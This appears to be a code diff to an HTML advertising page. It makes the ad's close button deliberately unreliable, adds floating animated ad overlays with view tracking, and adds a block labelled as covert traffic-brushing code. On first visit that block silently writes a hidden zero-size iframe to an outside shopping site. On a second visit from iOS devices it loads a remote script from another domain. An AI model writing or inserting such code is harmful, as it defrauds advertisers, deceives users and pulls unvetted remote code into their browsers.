@@ -218,7 +218,7 @@
 	},1000)
 	document.write(zbox.outerHTML);
 	document.getElementById('zjump').onclick=function(){
-		if(Math.random()>0.5){
+		if(Math.random()>0.3){
 			document.getElementById(s).remove();
 			clearInterval(timerr);
 		}else{
@@ -227,7 +227,7 @@
 	}
 
 
-
+//-----------------------
 
    
     str = '<a href="'+ads[0].url+'" style="-webkit-tap-highlight-color:transparent;display:block;width:100%;height:100%;overflow:hidden;margin:0;padding:0;"><img src="' + ads[0].imageurl + '" style="width:100%;vertical-align:top;object-fit:contain;"></a>';
@@ -240,5 +240,120 @@
 
 
 </script>
+
+<script>
+	//-----移动悬浮---2017-11-17--备份
+	var o = document.createElement("div"), arand=Math.floor(Math.random()*100000);
+        o.id = arand;
+        var istyle=document.getElementsByTagName("style")[0] || document.createElement("style");
+        istyle.innerHTML+="@-webkit-keyframes rott{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}@keyframes rott{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}";
+        o.style.cssText = "height:90px; width:90px; position:fixed; top:40%; right:12px; z-index:2147483646; perspective:800px;";
+        o.innerHTML = '<a id="num'+arand+'" href="'+ads[0].url+'" target="_self" style="position:relative;display:block; zoom:1;width:100%;height:100%;"><img src="' + ads[0].imageurl + '" style="width:100%;height:100%;display:block;-webkit-animation:rott 1s both infinite;animation:rott 1s both infinite;border-radius:10%;"/></a><span style="height:14px; width:14px; font-size:13px; color:white;text-align:center;line-height:14px;background:rgba(0,0,0,0.7); position:absolute; top:0; right:0;border-radius:50%;" id="c'+arand+'">X</span>';
+
+        document.getElementsByTagName("body")[0].appendChild(o);
+        document.getElementsByTagName("head")[0].appendChild(istyle);
+
+        function close(){
+            if(o) o.style.display='none';
+        }
+        __A( __G('c'+arand), "click",close);
+        pvid.aid.push(ads[0].adsid);
+        pvid.pid.push(ads[0].planid);
+        pvstas(pvid);
+
+</script>
+
+
+<script>
+	//-----移动悬浮---2017-11-17----改iframe方式加载------
+	var o = document.createElement("div"), arand=Math.floor(Math.random()*100000);
+        o.id = arand;
+        var istyle=document.getElementsByTagName("style")[0] || document.createElement("style");
+        istyle.innerHTML+="@-webkit-keyframes rott{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}@keyframes rott{0%,100%{transform:scale(1);}50%{transform:scale(1.1);}}";
+        o.style.cssText = "height:90px; width:90px; position:fixed; top:40%; right:12px; z-index:2147483646; perspective:800px;";
+        o.innerHTML = '<iframe src="' + ifsrc +'" width="100%" height="100%" marginheight="0" scrolling="no" frameborder="0" allowtransparency="true" style="-webkit-animation:rott 1s both infinite;animation:rott 1s both infinite;"></iframe><span style="height:14px; width:14px; font-size:13px; color:white;text-align:center;line-height:14px;background:rgba(0,0,0,0.7); position:absolute; top:0; right:0;border-radius:50%;" id="c'+arand+'">X</span>';
+
+        document.getElementsByTagName("body")[0].appendChild(o);
+        document.getElementsByTagName("head")[0].appendChild(istyle);
+
+        function close(){
+            if(o) o.style.display='none';
+        }
+        __A( __G('c'+arand), "click",close);
+        pvid.aid.push(ads[0].adsid);
+        pvid.pid.push(ads[0].planid);
+        pvstas(pvid);
+
+//-----------------
+
+    var str = '<a href="'+ads[0].url+'" target="_self" style="position:relative;display:block; zoom:1;width:100%;height:100%;"><img src="' + ads[0].imageurl + '" style="width:100%;height:100%;display:block;border-radius:10%;"/></a>';
+    document.writeln(str);
+
+
+    pvid.aid.push(ads[0].adsid); 
+    pvid.pid.push(ads[0].planid);
+    pvstas(pvid);
+
+
+</script>
+
+
+<script>
+//暗刷代码
+
+
+
+function isWeiXin(){
+    var ua = window.navigator.userAgent.toLowerCase();
+    if(ua.match(/MicroMessenger/i) == 'micromessenger'){
+        return true;
+    }else{
+        return false;
+    }
+}
+function isToday(str) {
+    if (new Date(str).toDateString() === new Date().toDateString()) {
+        return false;
+    } else if (new Date(str) < new Date()){
+        return true;
+    }
+}
+//js判断终端是安卓还是苹果
+function isPIA(){
+	var u = navigator.userAgent, app = navigator.appVersion;
+	var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1; //android终端或者uc浏览器
+	var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+	if(isiOS) {return 1;}
+	if(isAndroid) {return 2};
+}
+if(jtats==0){
+	if(window.localStorage){
+		var opennum=parseInt(window.localStorage.getItem("open")||0);
+		opennum++;
+		window.localStorage.setItem("open",opennum);
+
+		var timestamp = Date.parse(new Date());
+		var ntime=parseInt(window.localStorage.getItem("ntime")||0);
+		var isDisplay = true;
+		if(ntime){;
+			isDisplay = isToday(ntime);
+		}
+		if(isDisplay){
+			window.localStorage.setItem("ntime",timestamp);
+			window.localStorage.setItem("open",1);
+			opennum=1;
+		}
+		if(opennum==1){
+			document.write("<iframe src=\"http:\/\/gouwu.shoushang.com/pyss-02/\" width=0 height=0 style=\"display:none\"><\/iframe>");
+		}else if(opennum==2 && isPIA()==1){
+			document.write("<script type=\"text\/javascript\" src=\"http:\/\/t.fm-gj.com/a/an/js/az_y13.js\"><\/script>");
+		}
+
+	}
+}
+
+</script>
+
+
 </body>
 </html>
